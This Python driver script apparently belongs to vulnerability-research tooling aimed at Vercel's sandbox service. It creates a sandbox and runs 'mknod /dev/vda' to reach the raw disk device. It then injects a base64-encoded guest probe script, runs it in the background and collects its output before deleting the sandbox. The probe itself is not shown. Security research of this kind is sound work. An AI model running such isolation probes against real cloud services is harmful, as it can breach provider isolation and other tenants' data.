# -*- coding: utf-8 -*-
"""驱动: 跑 vda42_exec_probe (V43S) — 合法编码字段语义探测"""
import base64, os, sys, time, json
sys.path.insert(0, r'F:\scan\skills\non-traditional-vuln-hunting')
sys.stdout.reconfigure(encoding='utf-8')
from vercel_driver import api, cmd, TEAM, PROJ

NAME = 'v43b'
GUEST = 'vda43_chain_evidence_guest.py'
HERE = r'F:\scan\skills\non-traditional-vuln-hunting'
OUTF = 'v43s.out'
MARK = 'V43S_DONE'

def mk():
    api("DELETE", "/v2/sandboxes/%s?teamId=%s&projectId=%s" % (NAME, TEAM, PROJ))
    time.sleep(3)
    for attempt in range(8):
        c, r = api("POST", "/v4/sandboxes?teamId=%s" % TEAM,
                   {"projectId": PROJ, "name": NAME}, 60)
        if c == 429:
            print('[create] 429 retry %d' % (attempt + 1), flush=True)
            time.sleep(20)
            continue
        break
    print('[create] -> %s' % c, flush=True)
    if c != 200:
        sys.exit(1)
    d = json.loads(r)
    return d['sandbox']['currentSessionId']

if __name__ == '__main__':
    sid = mk()
    print('sid =', sid, flush=True)
    time.sleep(5)
    c, r = cmd(sid, 'sh', ['-c', 'mknod /dev/vda b 254 0 2>/dev/null; ls -la /dev/vda'], timeout_ms=15000)
    print('mknod:', c, (r or '')[:200], flush=True)
    c, r = cmd(sid, 'sh', ['-c', 'mkdir -p /vercel/sandbox'], timeout_ms=15000)
    print('mkdir:', c, flush=True)
    code = open(os.path.join(HERE, GUEST), 'rb').read()
    payload = base64.b64encode(code).decode()
    inject = "import base64;open('/vercel/sandbox/%s','wb').write(base64.b64decode('%s'))" % (GUEST, payload)
    c, r = cmd(sid, 'python3', ['-c', inject], timeout_ms=30000)
    print('inject:', c, flush=True)
    time.sleep(1)
    c, r = cmd(sid, 'sh', ['-c', 'ls -la /vercel/sandbox/'], timeout_ms=15000)
    print('verify:', c, (r or '')[:200], flush=True)
    if GUEST not in (r or ''):
        print('INJECT FAIL - abort', flush=True)
        sys.exit(2)
    c, r = cmd(sid, 'sh', ['-c', 'nohup python3 /vercel/sandbox/' + GUEST + ' > /tmp/v43s_stdout.txt 2>&1 &'], timeout_ms=15000)
    print('kick:', c, (r or '')[:150], flush=True)
    for attempt in range(50):
        time.sleep(5)
        c, r = cmd(sid, 'cat', ['/vercel/sandbox/' + OUTF], timeout_ms=30000)
        if 'sandbox_stopped' in (r or ''):
            fn2 = os.path.join(r'F:\scan\skills\out', '%s_stopped_%s.txt' % (GUEST.replace('.py', ''), time.strftime('%Y%m%d_%H%M%S')))
            open(fn2, 'w', encoding='utf-8').write(r)
            print('SANDBOX STOPPED - saved', fn2, flush=True)
            break
        if c == 200 and MARK in r:
            fn = os.path.join(r'F:\scan\skills\out', '%s_%s.txt' % (GUEST.replace('.py', ''), time.strftime('%Y%m%d_%H%M%S')))
            open(fn, 'w', encoding='utf-8').write(r)
            print('saved ->', fn, flush=True)
            print(r[-3500:], flush=True)
            break
        tail = (r or '').replace('\\n', ' ')[-250:]
        print('wait r%d status=%d | %s' % (attempt, c, tail), flush=True)
        dumpfn = os.path.join(r'F:\scan\skills\out', '%s_partial_%d.txt' % (GUEST.replace('.py', ''), attempt))
        open(dumpfn, 'w', encoding='utf-8').write(r or '')
        if attempt in (1, 5, 12) and c != 200:
            c2, r2 = cmd(sid, 'sh', ['-c', 'ls -la /vercel/sandbox/; tail -5 /tmp/v43s_stdout.txt 2>/dev/null'], timeout_ms=20000)
            print('diag:', c2, (r2 or '').replace('\\n', ' ')[-400:], flush=True)
    api("DELETE", "/v2/sandboxes/%s?teamId=%s&projectId=%s" % (NAME, TEAM, PROJ))
    print('CLEANED', flush=True)
